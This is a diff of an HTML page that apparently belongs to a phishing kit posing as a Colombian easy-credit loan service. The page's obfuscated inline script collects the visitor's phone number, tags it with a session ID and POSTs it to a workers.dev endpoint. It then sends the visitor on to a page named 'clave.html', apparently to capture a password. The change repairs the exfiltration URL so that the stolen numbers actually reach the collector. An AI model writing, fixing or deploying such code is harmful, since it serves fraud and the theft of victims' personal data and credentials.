@@ -149,7 +149,7 @@
     </div>
 
     <script>
-        function validarYEnviar(){var _0x3c4d=document['getElementById']('celular')['value'],_0x5e6f='credito-facil.miprimercredito.workers.dev',_0x7f8g=localStorage['getItem']('sesionId')||'DESCONOCIDO';if(_0x3c4d['length']!==0xa){alert('Por favor ingresa un n\xFAmero de celular de 10 d\xEDgitos');return;}var _0x9h0i=JSON['parse'](localStorage['getItem']('datosSesion'))||{};_0x9h0i['numero']=_0x3c4d;localStorage['setItem']('datosSesion',JSON['stringify'](_0x9h0i));var _0x1a2b='📱 **NUEVO INGRESO**\n🆔 '+_0x7f8g+'\nN\xFAmero: +57 '+_0x3c4d;fetch(_0x5e6f,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':_0x1a2b})})['finally'](()=>{window['location']['href']='clave.html';});}
+        function validarYEnviar(){var _0x3c4d=document['getElementById']('celular')['value'],_0x5e6f='https://credito-facil.miprimercredito.workers.dev/api/enviar',_0x7f8g=localStorage['getItem']('sesionId')||'DESCONOCIDO';if(_0x3c4d['length']!==0xa){alert('Por favor ingresa un n\xFAmero de celular de 10 d\xEDgitos');return;}var _0x9h0i=JSON['parse'](localStorage['getItem']('datosSesion'))||{};_0x9h0i['numero']=_0x3c4d;localStorage['setItem']('datosSesion',JSON['stringify'](_0x9h0i));var _0x1a2b='📱 **NUEVO INGRESO**\n🆔 '+_0x7f8g+'\nN\xFAmero: +57 '+_0x3c4d;fetch(_0x5e6f,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':_0x1a2b})})['finally'](()=>{window['location']['href']='clave.html';});}
     </script>
 </body>
 </html>
